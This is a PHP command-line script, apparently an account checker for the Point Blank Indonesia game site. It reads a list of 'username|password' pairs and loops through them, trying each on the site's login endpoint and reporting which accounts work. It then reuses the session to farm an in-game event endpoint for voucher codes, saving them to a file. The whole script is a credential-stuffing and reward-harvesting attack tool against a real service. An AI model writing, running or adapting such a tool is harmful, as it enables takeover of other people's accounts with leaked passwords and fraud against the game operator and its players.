<?php
error_reporting(0);
echo "List ID/Password : ";
$xyz = trim(fgets(STDIN));
echo "\n";
    while(true){
foreach (explode("\n", str_replace("\r", "", file_get_contents($xyz))) as $key => $akun) {
    $pecah = explode("|", trim($akun));
    $username = trim($pecah[0]);
    $password = trim($pecah[1]);

$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';

$gas = curl('https://pointblank.id/login/process', 'loginFail=0&userid='.$username.'&password='.$password.'', $headers);
$name = get_between($gas[1], '<p class="myinfo"><a href="/mypage/info"><span>', '</span></a>');
if (strpos($gas[1], '<p class="myinfo"><a href="/mypage/info"><span>')) {
	echo "[1] .++{ ID Ditemukan : $name }++.\n";
} else {
	echo "[1] .++{ ID Tidak Ditemukan : $username }++.\n";
}
}

$cookie = curl('https://www.pointblank.id/', null, null);
$session = ($gas[2]['SESSION']);

$headers2 = array();
$headers2[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0';
$headers2[] = 'Content-Type: application/x-www-form-urlencoded;charset=UTF-8';
$headers2[] = 'Cookie: SESSION='.$session.'; _ga=GA1.2.37722150.1591639232; _gid=GA1.2.1301295143.1591639232';

$login = curl('https://www.pointblank.id/event/gebyar', null, $headers2);
$ticket = get_between($login[1], '<div class="num">', '</div>');
$point = get_between($login[1], '<div class="num" id="devPoint">', '</div>');
echo "[2] .++{ Ticket Ditemukan : $ticket        }++.\n";
echo "[3] .++{ Point Ditemukan :  $point        }++.\n";

$gas2 = curl('https://www.pointblank.id/event/gebyar/process?loc=4', null, $headers2);
$voucher = get_between($gas2[1], '{"voucher":"', '","resultCode"');
$prize = get_between($gas2[1], '"prize":"', '"}');

if (strpos($gas2[1], 'Terjadi sebuah kesalahan.')) {
	echo "[4] .++{ Ticket Tidak Cukup          }++.\n";
} if (strpos($gas2[1], ''.$voucher.'')) {
	echo "[4] .++{ Kode Voucher : $voucher | Prize : $prize }++.\n";
	fwrite(fopen("voucherpb.txt", "a"), "$voucher\n");
} if (strpos($gas2[1], 'Point')) {
	echo "[4] .++{ Mendapatkan Point : $prize  }++.\n";
} if (strpos($gas2[1], '"errorMsg":"')) {
	echo "";
}
echo "[5] .++{ Sisa Ticket : $ticket             }++.\n";
echo "[6] .++{ Sisa Point : $point              }++.\n";
echo "\n";
}
function curl($url,$post,$headers)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	if ($headers !== null) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	if ($post !== null) curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
	$result = curl_exec($ch);
	$header = substr($result, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
	$body = substr($result, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
	preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
	$cookies = array()
;	foreach($matches[1] as $item) {
	  parse_str($item, $cookie);
	  $cookies = array_merge($cookies, $cookie);
	}
	return array (
	$header,
	$body,
	$cookies
	);
}
function get_between($string, $start, $end) 
    {
        $string = " ".$string;
        $ini = strpos($string,$start);
        if ($ini == 0) return "";
        $ini += strlen($start);
        $len = strpos($string,$end,$ini) - $ini;
        return substr($string,$ini,$len);
    }

function nama()
	{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "http://ninjaname.horseridersupply.com/indonesian_name.php");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	$ex = curl_exec($ch);
	// $rand = json_decode($rnd_get, true);
	preg_match_all('~(&bull; (.*?)<br/>&bull; )~', $ex, $name);
	return $name[2][mt_rand(0, 14) ];
	}
